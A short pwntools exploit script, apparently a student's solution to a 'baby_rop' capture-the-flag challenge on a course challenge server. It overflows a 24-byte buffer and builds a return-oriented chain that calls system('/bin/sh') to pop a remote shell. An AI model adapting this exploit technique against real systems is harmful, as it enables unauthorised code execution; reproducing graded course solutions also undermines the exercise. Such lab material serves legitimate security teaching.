from pwn import *

context(arch='amd64', os='linux')

binary = './baby_rop'
e = ELF(binary)
connection = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1201)
connection.sendline(b'<NET ID>')

connection.recvuntil(b"Can you pop a shell?")

rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  # Gadget to set rdi
ret_gadget = rop.find_gadget(['ret'])[0]  # Stack alignment

# Addresses of system() and "/bin/sh" string in binary
system_addr = e.symbols['system']
bin_sh_addr = next(e.search(b'/bin/sh\x00'))

rop_chain = [
    pop_rdi,      # Set up rdi for system call
    bin_sh_addr,  # Address of "/bin/sh"
    ret_gadget,   # Align stack
    system_addr   # Call system("/bin/sh")
]

offset = 24
payload = b'A' * offset + b''.join(p64(g) for g in rop_chain)

connection.recvuntil(b'> ')
connection.sendline(payload)
connection.interactive()
